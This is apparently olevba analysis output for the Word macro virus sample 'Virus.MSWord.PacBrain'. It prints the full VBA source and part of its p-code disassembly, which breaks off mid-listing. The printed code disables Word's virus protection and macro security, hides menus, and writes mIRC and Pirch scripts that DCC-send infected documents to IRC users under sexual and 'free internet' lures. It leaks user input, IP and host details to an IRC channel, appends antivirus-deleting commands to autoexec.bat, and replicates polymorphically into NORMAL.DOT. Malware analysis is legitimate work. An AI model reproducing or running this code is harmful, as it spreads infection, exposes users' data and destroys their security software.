olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.PacBrain
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.PacBrain - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.PacBrain - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'W97.PullUp
'coded by a.v_killer
Declare Function GetSystemDirectory Lib "kernel32" Alias
"GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Dim SysDir As String
SysDir = SystemDirectory
If Right(SysDir, 1) <> "\" Then SysDir = SysDir + "\"
.VBComponents("PullUp").Export SysDir & Application.UserName & ".dll"
.VBComponents.Import (SysDir & Application.UserName & ".dll")
Function SystemDirectory() As String
On Local Error Resume Next
Dim Winpath As String
Dim temp
Winpath = String(145, Chr(0))
temp = GetSystemDirectory(Winpath, 145)
SystemDirectory = Left(Winpath, InStr(Winpath, Chr(0)) - 1)
End Function


Private Sub Stealth()
On Error Resume Next
Application.DisplayAlerts = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = False
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("tools").Controls("Templates and Add-Ins...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("Format").Controls("Style...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
End Sub

Sub GetMirc()
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
If (Fso.FolderExists("c:\mirc")) Then
Set ini = Fso.opentextfile("C:\mirc\script.ini")
Fso.CopyFile wscript.ScriptFullName, "c:\windows\help\PullUp.vbs"
ini.writeline "[script]"
ini.writeline "on 1:FILERCVD:*.*:./dcc send $nick c:\windows\help\PullUp.vbs"
ini.writeline "on 1:FILESENT:*.*:./dcc send $nick c:\windows\help\PullUp.vbs"
ini.writeline "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\help\PullUp.vbs"
ini.writeline "ctcp 1:ping:?:/notice $nick pakis r the best | /halt"
ini.writeline "on 1:TEXT:*real*:#:/msg $chan PullUp"
ini.writeline "On 1:join:#:/msg $nick no one could deafeat pakis"
ini.writeline ";pakbrain "
ini.writeline ";pakis are really genius"
ini.Close
End If
End Sub

Private Sub Pirch()
On Error Resume Next
ASE3028 = Dir("C:\ReadMe.doc")
If ASE3028 = "" Then ActiveDocument.SaveAs "C:\ReadMe.doc"
NBC3506 = Dir("C:\mirc\mirc.ini")
If NBC3506 <> "" Then
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
KnJn11011 = MySeInVy & ByBy3077 & Int(Rnd * 4083)
Print #1, ";"
Print #1, "n0=on 1:start:{"
Print #1, "n1= /.remote on"
Print #1, "n2= /.ctcps on"
Print #1, "n3= /.events on"
Print #1, "n4= /.ebeeps off"
Print #1, "n5= /.pdcc 99999999999"
Print #1, "n6= /.dcc packetsize 4096"
Print #1, "n7=           }"
Print #1, "n8=on 1:connect:{ /.clearall"
Print #1, "n9=           /.enable #spreadin"
Print #1, "n10=          /.copy -o C:\ReadMe.doc C:\mustread.doc"
Print #1, "n11=        }"
Print #1, "n12=on 1:disconnect:{ /.remove C:\ReadMe.doc"
Print #1, "n13=              /.remove C:\mustread.doc"
Print #1, "n14=            }"
Print #1, "n15=alias /unload /echo 2*** Unloaded $1- | halt"
Print #1, "n16=on 1:input:*:/.msg #WVE_gen *-+-* [( $+ $active $+ ) $1-] $ip on $server $+ : $+ $port $+ *+* $host $usermode *+* $os $cb $url *+* $lastwin $active *-+-*"
Print #1, "n17=on 1:join:#:/.msg $nick To have the latest infos about Free Internet  TYPE: !readme  here or in $chan"
Print #1, "n18=on 1:nick:/.msg $newnick Hey $newnick is better than $nick ;)  If u want the biggest sex-password-list  TYPE: !sexlist  here or in $chan"
Print #1, "n19=on 1:kick:#:/.msg $chan If u need infos about the latest news in World  TYPE: !readme  here"
Print #1, "n20=on 1:filercvd:*.*:/.dcc send $nick C:\ReadMe.doc"
Print #1, "n21=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick C:\SexList.doc"
Print #1, "n22=on 1:text:*!readme*:#: { if ( $nick == $me ) {halt} | /.dcc send $nick C:\ReadMe.doc | /.msg $nick Here is the readme file u need, cya soon. }"
Print #1, "n23=on 1:text:*!sexlist*:#: {/.copy -o C:\ReadMe.doc C:\SexList.doc | if ( $nick == $me ) {halt} | /.dcc send $nick C:\SexList.doc | /.msg $nick Here is the password list u ask for, enjoy :) }"
Print #1, "n24=ctcp 1:*wvefileserver*:*:/.fserve $2 $3 $4"
Print #1, "n25=#spreadin off"
Print #1, "n26=on 1:part:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\ReadMe.doc | /.disable #spreadin | /.timersp 0 24 | /.enable #spreadin }"
Print #1, "n27=#spreadin end"
Close #1
End If
FUD3151 = Dir("C:\pirch98\pirch98.ini")
If FUD3151 <> "" Then
Open "C:\pirch98\events.ini" For Output As #1
Print #1, "[Levels]"
Print #1, "Enabled=1"
EtNy14023 = GiVeUeNl & ElEy11673 & Int(Rnd * 7258)
BiCu6512 = JeNkJpSe & PrIy13787 & Int(Rnd * 653)
Print #1, "Count=1"
Print #1, "Level1 = Dem"
Print #1, "DemEnabled = 1"
Print #1, ";"
Print #1, "[Dem]"
Print #1, "User1=*!*@*"
Print #1, "UserCount = 1"
Print #1, "Event1=ON JOIN:#:/dcc send $nick C:\ReadMe.doc | /msg $nick Hi! this is the file u ask for!"
Print #1, "Event2=ON PART:#:/dcc send $nick C:\ReadMe.doc | /notice $nick Hi! here comes your file! | /enable -q *"
Print #1, "Event3=ON TEXT:*walvgen*:#:/msg $nick WVE W0rm PirchVers. $identd $address"
Print #1, "Event4=ON TEXT:*wvefileserver*:*:/faccess $nick C:\ 5"
Print #1, "Event5=ON TEXT:*avp*:*:/ignore $nick 1"
Print #1, "Event6=ON TEXT:*ReadMe*:*:/ignore $nick 1"
Print #1, "Event7=ON TEXT:*doc*:*:/ignore $nick 1"
Print #1, "Event8=ON TEXT:*worm*:*:/ignore $nick 1"
Print #1, "Event9=ON TEXT:*virus*:*:/ignore $nick 1"
Print #1, "Event10=ON TEXT:*info*:*:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event11=ON TEXT:*trad*:*:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event12=ON QUIT:/msg #WVE_gen WVE W0rm PirchVers. was here ... $identd $address"
Print #1, "Event13=ON DCCDONE:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event14=ON DCCSENT:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
Print #1, "EventCount = 14"
Print #1, ";"
Print #1, "[DCC]"
Print #1, "AutoHideDccWin = 1"
Close #1
End If
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\MeGALiTH Software\Visual IRC96\Events", "Event17") = "dcc send $nick C:\ReadMe.doc"
End Sub

Function GenName$()
i = 4 + Rnd() * 3
a$ = ""
For j = 1 To i: a$ = a$ + Chr$(65 + Rnd() * 23): Next j
GenName$ = a$
End Function

Sub InsertParaEnd()
InsertPara
i = Rnd()
If i < 0.2 Then Insert GenName$ + "=" + Str$(100 * Rnd()) Else If i < 0.4 Then Insert GenName$ + "=Rnd()" Else If i < 0.6 Then Insert GenName$ + " = Now()" Else If i < 0.8 Then Insert "REM " + GenName$ Else If i > 0.81 And i < 0.813 Then Insert "REM (c) " + "Nasty Lamer & Ugly Luser" + ", Slovakia" Else If i > 0.82 And i < 0.823 Then Insert "REM Do not forget: SlovakDictator is mother of all macro viruses of the new generation ! "
If i < 0.95 Then InsertPara
End Sub

Sub InsertLine(cmd$, a$, b$, c$)
Insert cmd$ + " "
For i = 1 To 5
If Rnd() > 0.5 Then
    d$ = a$: a$ = b$: b$ = d$
Else
    d$ = b$: b$ = c$: c$ = d$
End If
Next i
Insert a$ + ", " + b$ + ", " + c$
End Sub

Function GenPolyMacro$(where, thismacro$)
xMacroName$ = GenName$
xAutoTextName$ = GenName$
xDocVar$ = GenName$
xWinName$ = GenName$ + "$"
xInfType$ = Str$(where)
xOnError$ = GenName$
ToolsMacro .Edit, .Name = thismacro$, .Show = where
ViewToolbars .Toolbar = "Macro", .Hide
If where = 1 Then ParaUp
InsertParaEnd: InsertParaEnd
Insert "On Error Goto " + xOnError$: InsertParaEnd
Insert "ScreenUpdating 0": InsertParaEnd
Insert xDocVar$ + "$ =" + Chr$(34) + "A" + Chr$(34): InsertParaEnd
Insert "SetDocumentVar " + xDocVar$ + "$, " + Chr$(34) + xAutoTextName$ + Chr$(34): InsertParaEnd
Insert xWinName$ + " = WindowName$()": InsertParaEnd
InsertLine("ToolsMacro", ".Name=" + Chr$(34) + xMacroName$ + Chr$(34), ".Show=" + xInfType$, ".Edit") : InsertParaEnd
InsertLine("EditAutoText", ".Name=" + Chr$(34) + xAutoTextName$ + Chr$(34), ".InsertAs=0", ".Insert") : InsertParaEnd
Insert "DocClose 1": InsertParaEnd
Insert "Activate " + xWinName$: InsertParaEnd
Insert "Call " + xMacroName$: InsertParaEnd
InsertLine("ToolsMacro", ".Name=" + Chr$(34) + xMacroName$ + Chr$(34), ".Show=" + xInfType$, ".Delete") : InsertParaEnd
Insert xOnError$ + ":": InsertParaEnd
DocClose 1
GenPolyMacro$ = xAutoTextName$
End Function
Private Sub Retro()
On Error Resume Next
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo muffin muffin muffin"
Print #1, "echo ** muffin **"
Print #1, "echo want some"

Print #1, "echo [Norton System Check]"
Print #1, "del c:\progra~1\norton~1\*.exe"
Print #1, "del c:\progra~1\norton~1\*.dll"
Print #1, "del c:\progra~1\norton~1\*.dat"

Print #1, "del c:\progra~1\norton~1\*.vxd"
Print #1, "del c:\norton~1\*.exe"
Print #1, "del c:\norton~1\*.dll"
Print #1, "del c:\norton~1\*.dat"
Print #1, "del c:\norton~1\*.vxd"
Print #1, "echo."

Print #1, "echo [AVP System Check]"
Print #1, "del c:\progra~1\antiv~1\*.avc "
Print #1, "del c:\progra~1\antiv~1\*.set "
Print #1, "del c:\progra~1\antiv~1\*.dll "
Print #1, "del c:\progra~1\antiv~1\*.vxd "
Print #1, "del c:\progra~1\antiv~1\*.exe "
Print #1, "del c:\antiv~1\*.avc "

Print #1, "del c:\antiv~1\*.set "
Print #1, "del c:\antiv~1\*.dll "
Print #1, "del c:\antiv~1\*.vxd "
Print #1, "del c:\antiv~1\*.exe "
Print #1, "echo."

Print #1, "echo [McAfee System Check]"
Print #1, "del c:\progra~1\mcafee~1\*.dat "
Print #1, "del c:\progra~1\mcafee~1\*.dll "
Print #1, "del c:\progra~1\mcafee~1\*.exe "
Print #1, "del c:\progra~1\mcafee~1\*.vsc "
Print #1, "del c:\progra~1\mcafee\*.dat "

Print #1, "del c:\progra~1\mcafee\*.dll "
Print #1, "del c:\progra~1\mcafee\*.exe "
Print #1, "del c:\progra~1\mcafee\*.vsc "
Print #1, "del c:\mcafee~1\*.dat"
Print #1, "del c:\mcafee~1\*.dll"
Print #1, "del c:\mcafee~1\*.exe"
Print #1, "del c:\mcafee~1\*.vsc"
Print #1, "del c:\mcafee\*.dat"
Print #1, "del c:\mcafee\*.dll"
Print #1, "del c:\mcafee\*.exe"
Print #1, "del c:\mcafee\*.vsc"
Print #1, "echo."
Close #1
End Sub
Sub Infect(where)
xOldAutoTextName$ = GetDocumentVar$("A")
normaldot$ = UCase$(DefaultDir$(2) + "\NORMAL.DOT")
inffile$ = FileName$()
If where = 1 Then
    xAutoTextName$ = GenPolyMacro$(where, "FileSave")
    Organizer .Copy, .Source = inffile$, .Destination = normaldot$, .Name = xOldAutoTextName$, .Tab = 1
    Organizer .Rename, .Source = normaldot$, .Name = xOldAutoTextName$, .NewName = xAutoTextName$, .Tab = 1
    MacroCopy normaldot$ + ":FileSave", normaldot$ + ":FileSave", 1
    MacroCopy normaldot$ + ":FileSave", normaldot$ + ":ToolsMacro", 1
    CustomizeMenu
Else
    xAutoTextName$ = GenPolyMacro$(where, "AutoOpen")
    Organizer .Copy, .Source = normaldot$, .Destination = inffile$, .Name = xOldAutoTextName$, .Tab = 1
    Organizer .Rename, .Source = inffile$, .Name = xOldAutoTextName$, .NewName = xAutoTextName$, .Tab = 1
    MacroCopy inffile$ + ":AutoOpen", inffile$ + ":AutoOpen", 1
End If

ToolsOptionsUserInfo .Name = "Pull", .Initials = "Up"

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.PacBrain
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1105 bytes
' Macros/VBA/Module1 - 20669 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x000A "W97.PullUp"
' Line #2:
' 	QuoteRem 0x0000 0x0013 "coded by a.v_killer"
' Line #3:
' 	Reparse 0x0038 "Declare Function GetSystemDirectory Lib "kernel32" Alias"
' Line #4:
' 	Reparse 0x004D ""GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long"
' Line #5:
' 	Dim 
' 	VarDefn SysDir (As String)
' Line #6:
' 	Ld SystemDirectory 
' 	St SysDir 
' Line #7:
' 	Ld SysDir 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld SysDir 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St SysDir 
' 	EndIf 
' Line #8:
' 	Ld SysDir 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".dll"
' 	Concat 
' 	LitStr 0x0006 "PullUp"
' 	ArgsMemLdWith VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	Ld SysDir 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".dll"
' 	Concat 
' 	Paren 
' 	MemLdWith VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #10:
' 	FuncDefn (Function SystemDirectory() As String)
' Line #11:
' 	OnError <crash> 
' Line #12:
' 	Dim 
' 	VarDefn Winpath (As String)
' Line #13:
' 	Dim 
' 	VarDefn temp
' Line #14:
' 	LitDI2 0x0091 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String 0x0002 
' 	St Winpath 
' Line #15:
' 	Ld Winpath 
' 	LitDI2 0x0091 
' 	ArgsLd GetSystemDirectory 0x0002 
' 	St temp 
' Line #16:
' 	Ld Winpath 
' 	Ld Winpath 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Left 0x0002 
' 	St SystemDirectory 
' Line #17:
' 	EndFunc 
' Line #18:
' Line #19:
' Line #20:
' 	FuncDefn (Private Sub Stealth())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #30:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #31:
' 	LitVarSpecial (False)
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #32:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #33:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Style..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #34:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #35:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #36:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Sub GetMirc())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set Fso 
' Line #43:
' 	LitStr 0x0007 "c:\mirc"
' 	Ld Fso 
' 	ArgsMemLd FolderExists 0x0001 
' 	Paren 
' 	IfBlock 
' Line #44:
' 	SetStmt 
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	Ld Fso 
' 	ArgsMemLd opentextfile 0x0001 
' 	Set ini 
' Line #45:
' 	Ld wscript 
' 	MemLd ScriptFullName 
' 	LitStr 0x001A "c:\windows\help\PullUp.vbs"
' 	Ld Fso 
' 	ArgsMemCall CopyFile 0x0002 
' Line #46:
' 	LitStr 0x0008 "[script]"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #47:
' 	LitStr 0x003D "on 1:FILERCVD:*.*:./dcc send $nick c:\windows\help\PullUp.vbs"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #48:
' 	LitStr 0x003D "on 1:FILESENT:*.*:./dcc send $nick c:\windows\help\PullUp.vbs"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #49:
' 	LitStr 0x0054 "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\help\PullUp.vbs"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #50:
' 	LitStr 0x0034 "ctcp 1:ping:?:/notice $nick pakis r the best | /halt"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #51:
' 	LitStr 0x0024 "on 1:TEXT:*real*:#:/msg $chan PullUp"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #52:
' 	LitStr 0x0031 "On 1:join:#:/msg $nick no one could deafeat pakis"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #53:
' 	LitStr 0x000A ";pakbrain "
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #54:
' 	LitStr 0x0018 ";pakis are really genius"
' 	Ld ini 
' 	ArgsMemCall writeline 0x0001 
' Line #55:
' 	Ld ini 
' 	ArgsMemCall Close 0x0000 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Private Sub Pirch())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitStr 0x000D "C:\ReadMe.doc"
' 	ArgsLd Dir 0x0001 
' 	St ASE3028 
' Line #62:
' 	Ld ASE3028 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "C:\ReadMe.doc"
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #63:
' 	LitStr 0x0010 "C:\mirc\mirc.ini"
' 	ArgsLd Dir 0x0001 
' 	St NBC3506 
' Line #64:
' 	Ld NBC3506 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #65:
' 	LitStr 0x0012 "C:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #67:
' 	Ld MySeInVy 
' 	Ld ByBy3077 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0FF3 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St KnJn11011 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 ";"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n0=on 1:start:{"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n1= /.remote on"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "n2= /.ctcps on"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n3= /.events on"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "n4= /.ebeeps off"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "n5= /.pdcc 99999999999"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "n6= /.dcc packetsize 4096"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n7=           }"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "n8=on 1:connect:{ /.clearall"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "n9=           /.enable #spreadin"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "n10=          /.copy -o C:\ReadMe.doc C:\mustread.doc"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "n11=        }"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "n12=on 1:disconnect:{ /.remove C:\ReadMe.doc"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "n13=              /.remove C:\mustread.doc"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "n14=            }"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "n15=alias /unload /echo 2*** Unloaded $1- | halt"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x009D "n16=on 1:input:*:/.msg #WVE_gen *-+-* [( $+ $active $+ ) $1-] $ip on $server $+ : $+ $port $+ *+* $host $usermode *+* $os $cb $url *+* $lastwin $active *-+-*"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0069 "n17=on 1:join:#:/.msg $nick To have the latest infos about Free Internet  TYPE: !readme  here or in $chan"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x008C "n18=on 1:nick:/.msg $newnick Hey $newnick is better than $nick ;)  If u want the biggest sex-password-list  TYPE: !sexlist  here or in $chan"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005F "n19=on 1:kick:#:/.msg $chan If u need infos about the latest news in World  TYPE: !readme  here"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "n20=on 1:filercvd:*.*:/.dcc send $nick C:\ReadMe.doc"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005D "n21=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick C:\SexList.doc"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0092 "n22=on 1:text:*!readme*:#: { if ( $nick == $me ) {halt} | /.dcc send $nick C:\ReadMe.doc | /.msg $nick Here is the readme file u need, cya soon. }"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00C0 "n23=on 1:text:*!sexlist*:#: {/.copy -o C:\ReadMe.doc C:\SexList.doc | if ( $nick == $me ) {halt} | /.dcc send $nick C:\SexList.doc | /.msg $nick Here is the password list u ask for, enjoy :) }"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "n24=ctcp 1:*wvefileserver*:*:/.fserve $2 $3 $4"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "n25=#spreadin off"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x008D "n26=on 1:part:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\ReadMe.doc | /.disable #spreadin | /.timersp 0 24 | /.enable #spreadin }"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "n27=#spreadin end"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	LitStr 0x0016 "C:\pirch98\pirch98.ini"
' 	ArgsLd Dir 0x0001 
' 	St FUD3151 
' Line #100:
' 	Ld FUD3151 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #101:
' 	LitStr 0x0015 "C:\pirch98\events.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[Levels]"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Enabled=1"
' 	PrintItemNL 
' Line #104:
' 	Ld GiVeUeNl 
' 	Ld ElEy11673 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1C5A 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St EtNy14023 
' Line #105:
' 	Ld JeNkJpSe 
' 	Ld PrIy13787 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x028D 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St BiCu6512 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Count=1"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Level1 = Dem"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "DemEnabled = 1"
